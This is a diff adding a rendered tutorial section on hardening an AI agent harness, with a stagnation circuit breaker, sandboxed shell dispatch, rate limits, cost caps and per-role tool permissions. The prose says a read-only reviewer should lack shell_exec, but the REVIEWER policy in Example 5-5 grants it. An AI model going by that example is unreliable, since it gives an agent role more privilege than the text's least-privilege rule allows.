+<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>
+<a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>            <span class="c1"># --- Model call ---</span>
+<a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>            <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">model_fn</span><span class="p">(</span><span class="n">messages</span><span class="p">,</span> <span class="n">tools</span><span class="o">=</span><span class="n">TOOL_SCHEMAS</span><span class="p">)</span>
+<a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>            <span class="n">tokens_used</span> <span class="o">+=</span> <span class="n">response</span><span class="o">.</span><span class="n">usage</span><span class="o">.</span><span class="n">total_tokens</span>
+<a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>
+<a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>            <span class="c1"># --- Text response = done ---</span>
+<a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>            <span class="k">if</span> <span class="ow">not</span> <span class="n">response</span><span class="o">.</span><span class="n">tool_call</span><span class="p">:</span>
+<a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>                <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;complete&quot;</span><span class="p">,</span> <span class="s2">&quot;steps&quot;</span><span class="p">:</span> <span class="n">step</span><span class="p">,</span>
+<a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>                        <span class="s2">&quot;tokens&quot;</span><span class="p">:</span> <span class="n">tokens_used</span><span class="p">,</span> <span class="s2">&quot;answer&quot;</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">}</span>
+<a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>
+<a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>            <span class="c1"># --- Circuit breaker: detect stagnation ---</span>
+<a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>            <span class="n">action_sig</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">tool_call</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">tool_call</span><span class="o">.</span><span class="n">arguments</span><span class="si">}</span><span class="s2">&quot;</span>
+<a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a>            <span class="n">recent_actions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">action_sig</span><span class="p">)</span>
+<a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a>            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">recent_actions</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+<a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a>                <span class="n">recent_actions</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a>            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">recent_actions</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">recent_actions</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+<a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a>                <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_halt</span><span class="p">(</span><span class="s2">&quot;stagnation&quot;</span><span class="p">,</span> <span class="n">step</span><span class="p">,</span> <span class="n">tokens_used</span><span class="p">)</span>
+<a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a>
+<a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a>            <span class="c1"># --- Tool dispatch ---</span>
+<a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a>            <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_execute_tool</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">tool_call</span><span class="p">)</span>
+<a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a>
+<a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a>            <span class="c1"># --- Feed result back ---</span>
+<a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a>            <span class="n">messages</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;assistant&quot;</span><span class="p">,</span> <span class="s2">&quot;tool_call&quot;</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">tool_call</span><span class="p">})</span>
+<a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a>            <span class="n">messages</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;tool&quot;</span><span class="p">,</span> <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">)})</span>
+<a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a>
+<a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a>        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_halt</span><span class="p">(</span><span class="s2">&quot;max_steps&quot;</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">tokens_used</span><span class="p">)</span>
+<a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a>
+<a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a>    <span class="k">def</span> <span class="nf">_execute_tool</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tool_call</span><span class="p">):</span>
+<a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a>        <span class="n">name</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="n">tool_call</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="n">tool_call</span><span class="o">.</span><span class="n">arguments</span>
+<a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a>        <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="s2">&quot;shell_exec&quot;</span><span class="p">:</span>
+<a id="__codelineno-4-54" name="__codelineno-4-54" href="#__codelineno-4-54"></a>            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;command&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">))</span>
+<a id="__codelineno-4-55" name="__codelineno-4-55" href="#__codelineno-4-55"></a>        <span class="k">if</span> <span class="n">name</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">tools</span><span class="p">:</span>
+<a id="__codelineno-4-56" name="__codelineno-4-56" href="#__codelineno-4-56"></a>            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">tools</span><span class="p">[</span><span class="n">name</span><span class="p">](</span><span class="o">**</span><span class="n">args</span><span class="p">)</span>
+<a id="__codelineno-4-57" name="__codelineno-4-57" href="#__codelineno-4-57"></a>        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;Unknown tool: </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">}</span>
+<a id="__codelineno-4-58" name="__codelineno-4-58" href="#__codelineno-4-58"></a>
+<a id="__codelineno-4-59" name="__codelineno-4-59" href="#__codelineno-4-59"></a>    <span class="k">def</span> <span class="nf">_halt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">reason</span><span class="p">,</span> <span class="n">step</span><span class="p">,</span> <span class="n">tokens</span><span class="p">):</span>
+<a id="__codelineno-4-60" name="__codelineno-4-60" href="#__codelineno-4-60"></a>        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="n">reason</span><span class="p">,</span> <span class="s2">&quot;steps&quot;</span><span class="p">:</span> <span class="n">step</span><span class="p">,</span> <span class="s2">&quot;tokens&quot;</span><span class="p">:</span> <span class="n">tokens</span><span class="p">}</span>
+</code></pre></div>
+<p>Notice the architecture:</p>
+<ul>
+<li><strong>Budget gate</strong> from Section 2.3 runs first — no work happens if the budget is gone.</li>
+<li><strong>Circuit breaker</strong> detects stagnation (Section 2.2, failure mode #2) by comparing recent actions.</li>
+<li><strong>Tool dispatch</strong> routes <code>shell_exec</code> to the sandbox and everything else to direct execution.</li>
+<li><strong>Message threading</strong> accumulates the full conversation so the model has context.</li>
+</ul>
+<h3 id="check-yourself_3">Check yourself<a class="headerlink" href="#check-yourself_3" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Which two sections' patterns does this loop combine?</li>
+<li>Why does <code>shell_exec</code> route to the sandbox but <code>file_read</code> does not?</li>
+<li>What would you change to support <em>parallel</em> tool calls?</li>
+</ol>
+<hr />
+<h2 id="concept-loop-5-production-hardening">Concept loop 5: Production hardening<a class="headerlink" href="#concept-loop-5-production-hardening" title="Permanent link">&para;</a></h2>
+<h3 id="concept_4">Concept<a class="headerlink" href="#concept_4" title="Permanent link">&para;</a></h3>
+<p>The loop from Example 5-4 works in a demo. In production, it will be poked by adversarial inputs, called thousands of times per hour, and expected to handle partial failures gracefully. Five hardening controls close the gap:</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>What it prevents</th>
+<th>Implementation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Rate limits</strong></td>
+<td>Token burn from tight loops</td>
+<td>Token bucket per user/session</td>
+</tr>
+<tr>
+<td><strong>Cost caps</strong></td>
+<td>Runaway spending on model APIs</td>
+<td>Hard dollar ceiling per task</td>
+</tr>
+<tr>
+<td><strong>Timeouts</strong></td>
+<td>Hung sandboxes, slow models</td>
+<td>Layered: per-tool, per-step, per-task</td>
+</tr>
+<tr>
+<td><strong>Capability permissions</strong></td>
+<td>Privilege escalation</td>
+<td>Allowlist of tools per agent role</td>
+</tr>
+<tr>
+<td><strong>Audit logging</strong></td>
+<td>Undetected misuse</td>
+<td>Append-only structured log</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Warning:</strong> Cost caps are not optional. A single agent with access to GPT-4 and no cost cap can burn $500 in under ten minutes on a recursive decomposition task. Ask us how we know. (See Section 2.2's retry storm failure mode — tight loops with no budget gate are the leading cause of runaway spend.)</p>
+</blockquote>
+<p><strong>Capability-based permissions</strong> deserve special attention. Not every agent needs every tool. A <em>read-only reviewer</em> agent should not have <code>file_write</code> or <code>shell_exec</code>. A <em>code runner</em> agent should not have <code>git_push</code>. The principle of least privilege applies to agents exactly as it applies to Unix processes — and for the same reasons.</p>
+<h3 id="worked-example_4">Worked example<a class="headerlink" href="#worked-example_4" title="Permanent link">&para;</a></h3>
+<p>We add a policy layer that enforces rate limits, cost caps, and capability permissions on top of the harness from Example 5-4.</p>
+<h3 id="example-5-5-production-policy-layer">Example 5-5. Production policy layer<a class="headerlink" href="#example-5-5-production-policy-layer" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kn">import</span> <span class="nn">time</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="kn">from</span> <span class="nn">dataclasses</span> <span class="kn">import</span> <span class="n">dataclass</span><span class="p">,</span> <span class="n">field</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="nd">@dataclass</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="k">class</span> <span class="nc">AgentPolicy</span><span class="p">:</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;What an agent can do and how much it can spend.&quot;&quot;&quot;</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>    <span class="n">allowed_tools</span><span class="p">:</span> <span class="nb">set</span> <span class="o">=</span> <span class="n">field</span><span class="p">(</span><span class="n">default_factory</span><span class="o">=</span><span class="k">lambda</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;file_read&quot;</span><span class="p">})</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>    <span class="n">max_cost_usd</span><span class="p">:</span> <span class="nb">float</span> <span class="o">=</span> <span class="mf">1.00</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>    <span class="n">max_tokens_per_minute</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">10_000</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>    <span class="n">max_tool_calls_per_minute</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">30</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>    <span class="n">tool_timeout_s</span><span class="p">:</span> <span class="nb">dict</span> <span class="o">=</span> <span class="n">field</span><span class="p">(</span><span class="n">default_factory</span><span class="o">=</span><span class="k">lambda</span><span class="p">:</span> <span class="p">{</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>        <span class="s2">&quot;file_read&quot;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="s2">&quot;file_write&quot;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="s2">&quot;shell_exec&quot;</span><span class="p">:</span> <span class="mi">30</span><span class="p">})</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="c1"># Predefined roles</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="n">REVIEWER</span> <span class="o">=</span> <span class="n">AgentPolicy</span><span class="p">(</span><span class="n">allowed_tools</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;file_read&quot;</span><span class="p">,</span> <span class="s2">&quot;shell_exec&quot;</span><span class="p">},</span> <span class="n">max_cost_usd</span><span class="o">=</span><span class="mf">0.50</span><span class="p">)</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="n">EDITOR</span> <span class="o">=</span> <span class="n">AgentPolicy</span><span class="p">(</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>    <span class="n">allowed_tools</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;file_read&quot;</span><span class="p">,</span> <span class="s2">&quot;file_write&quot;</span><span class="p">,</span> <span class="s2">&quot;shell_exec&quot;</span><span class="p">},</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>    <span class="n">max_cost_usd</span><span class="o">=</span><span class="mf">2.00</span><span class="p">,</span> <span class="n">max_tool_calls_per_minute</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="k">class</span> <span class="nc">PolicyEnforcer</span><span class="p">:</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Wraps tool dispatch with production safety controls.&quot;&quot;&quot;</span>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">policy</span><span class="p">:</span> <span class="n">AgentPolicy</span><span class="p">):</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">policy</span> <span class="o">=</span> <span class="n">policy</span>
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">cost_usd</span> <span class="o">=</span> <span class="mf">0.0</span>
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">token_window</span> <span class="o">=</span> <span class="p">[]</span>   <span class="c1"># (timestamp, count)</span>
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">call_window</span> <span class="o">=</span> <span class="p">[]</span>    <span class="c1"># timestamps</span>
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>    <span class="k">def</span> <span class="nf">check_tool_allowed</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tool_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>        <span class="k">if</span> <span class="n">tool_name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">policy</span><span class="o">.</span><span class="n">allowed_tools</span><span class="p">:</span>
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>            <span class="k">raise</span> <span class="ne">PermissionError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Tool &#39;</span><span class="si">{</span><span class="n">tool_name</span><span class="si">}</span><span class="s2">&#39; not allowed&quot;</span><span class="p">)</span>
+<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>
+<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a>    <span class="k">def</span> <span class="nf">check_rate_limit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tokens</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>        <span class="n">now</span><span class="p">,</span> <span class="n">cutoff</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="mi">60</span>
+<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">token_window</span> <span class="o">=</span> <span class="p">[(</span><span class="n">t</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">t</span><span class="p">,</span> <span class="n">n</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">token_window</span> <span class="k">if</span> <span class="n">t</span> <span class="o">&gt;</span> <span class="n">cutoff</span><span class="p">]</span>
+<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">call_window</span> <span class="o">=</span> <span class="p">[</span><span class="n">t</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">call_window</span> <span class="k">if</span> <span class="n">t</span> <span class="o">&gt;</span> <span class="n">cutoff</span><span class="p">]</span>
+<a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a>        <span class="k">if</span> <span class="nb">sum</span><span class="p">(</span><span class="n">n</span> <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">n</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">token_window</span><span class="p">)</span> <span class="o">+</span> <span class="n">tokens</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">policy</span><span class="o">.</span><span class="n">max_tokens_per_minute</span><span class="p">:</span>
+<a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a>            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&quot;Token rate limit exceeded&quot;</span><span class="p">)</span>
+<a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a>        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">call_window</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">policy</span><span class="o">.</span><span class="n">max_tool_calls_per_minute</span><span class="p">:</span>
+<a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a>            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&quot;Tool call rate limit exceeded&quot;</span><span class="p">)</span>
+<a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">token_window</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">now</span><span class="p">,</span> <span class="n">tokens</span><span class="p">))</span>
+<a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">call_window</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">now</span><span class="p">)</span>
+<a id="__codelineno-5-43" name="__codelineno-5-43" href="#__codelineno-5-43"></a>
+<a id="__codelineno-5-44" name="__codelineno-5-44" href="#__codelineno-5-44"></a>    <span class="k">def</span> <span class="nf">check_cost</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tokens</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">cost_per_1k</span><span class="p">:</span> <span class="nb">float</span> <span class="o">=</span> <span class="mf">0.003</span><span class="p">):</span>
+<a id="__codelineno-5-45" name="__codelineno-5-45" href="#__codelineno-5-45"></a>        <span class="n">projected</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cost_usd</span> <span class="o">+</span> <span class="p">(</span><span class="n">tokens</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">)</span> <span class="o">*</span> <span class="n">cost_per_1k</span>
+<a id="__codelineno-5-46" name="__codelineno-5-46" href="#__codelineno-5-46"></a>        <span class="k">if</span> <span class="n">projected</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">policy</span><span class="o">.</span><span class="n">max_cost_usd</span><span class="p">:</span>
+<a id="__codelineno-5-47" name="__codelineno-5-47" href="#__codelineno-5-47"></a>            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Cost cap: $</span><span class="si">{</span><span class="n">projected</span><span class="si">:</span><span class="s2">.4f</span><span class="si">}</span><span class="s2"> &gt; $</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">policy</span><span class="o">.</span><span class="n">max_cost_usd</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<a id="__codelineno-5-48" name="__codelineno-5-48" href="#__codelineno-5-48"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">cost_usd</span> <span class="o">=</span> <span class="n">projected</span>
+<a id="__codelineno-5-49" name="__codelineno-5-49" href="#__codelineno-5-49"></a>
+<a id="__codelineno-5-50" name="__codelineno-5-50" href="#__codelineno-5-50"></a>    <span class="k">def</span> <span class="nf">get_timeout</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tool_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+<a id="__codelineno-5-51" name="__codelineno-5-51" href="#__codelineno-5-51"></a>        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">policy</span><span class="o">.</span><span class="n">tool_timeout_s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">tool_name</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
+</code></pre></div>
+<p>Integrating this into the harness requires two changes to <code>HarnessedAgent._execute_tool</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">def</span> <span class="nf">_execute_tool</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tool_call</span><span class="p">,</span> <span class="n">enforcer</span><span class="p">:</span> <span class="n">PolicyEnforcer</span><span class="p">):</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>    <span class="n">name</span> <span class="o">=</span> <span class="n">tool_call</span><span class="o">.</span><span class="n">name</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="n">enforcer</span><span class="o">.</span><span class="n">check_tool_allowed</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    <span class="n">timeout</span> <span class="o">=</span> <span class="n">enforcer</span><span class="o">.</span><span class="n">get_timeout</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>    <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="s2">&quot;shell_exec&quot;</span><span class="p">:</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>            <span class="n">tool_call</span><span class="o">.</span><span class="n">arguments</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;command&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>            <span class="n">timeout_s</span><span class="o">=</span><span class="n">timeout</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>        <span class="p">)</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>    <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">tools</span><span class="p">[</span><span class="n">name</span><span class="p">](</span><span class="o">**</span><span class="n">tool_call</span><span class="o">.</span><span class="n">arguments</span><span class="p">)</span>
+</code></pre></div>
+<blockquote>
+<p><strong>Tip:</strong> In production, wrap each enforcer check in a try/except and return a structured error to the model. Models handle "Permission denied: tool 'git_push' not allowed for this role" better than a crashed process.</p>
+</blockquote>
+<h3 id="check-yourself_4">Check yourself<a class="headerlink" href="#check-yourself_4" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Why does the <code>REVIEWER</code> policy exclude <code>file_write</code>?</li>
+<li>What is the risk if you set <code>max_cost_usd</code> too high?</li>
+<li>How would you implement per-tool rate limits instead of per-agent rate limits?</li>
+</ol>
+<hr />
+<h2 id="what-we-built">What we built<a class="headerlink" href="#what-we-built" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Section</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Inert vs. tool-equipped agent</td>
+<td>Loop 1</td>
+<td>Understand the generation-execution gap</td>
+</tr>
+<tr>
+<td>Tool schemas + dispatch router</td>
+<td>Loop 2</td>
+<td>Structured model↔tool communication</td>
+</tr>
+<tr>
+<td>Docker sandbox with resource limits</td>
+<td>Loop 3</td>
+<td>Isolated execution of untrusted code</td>
+</tr>
+<tr>
+<td>Full harness loop</td>
+<td>Loop 4</td>
+<td>Budget + circuit breaker + tools + sandbox</td>
+</tr>
+<tr>
+<td>Policy enforcer with RBAC</td>
+<td>Loop 5</td>
+<td>Rate limits, cost caps, capability permissions</td>
+</tr>
+</tbody>
+</table>
+<p>This stack extends Section 2.3's reliability harness with the execution machinery that was previously assumed. It also provides the execution substrate for Section 4.2's orchestrator — the Loom framework delegates to tools; this section shows how those tools run safely.</p>
+<h2 id="verification-checklist">Verification checklist<a class="headerlink" href="#verification-checklist" title="Permanent link">&para;</a></h2>
+<ul>
+<li>[ ] I can explain why a raw model cannot self-correct without tool-calling</li>
+<li>[ ] I can write a JSON Schema tool definition with required parameters</li>
+<li>[ ] I can trace the three-step tool-calling protocol (definition → call → result)</li>
+<li>[ ] I can configure a Docker sandbox with network, memory, and CPU limits</li>
+<li>[ ] I can identify the three sandbox threat axes (destructive, exfiltration, exhaustion)</li>
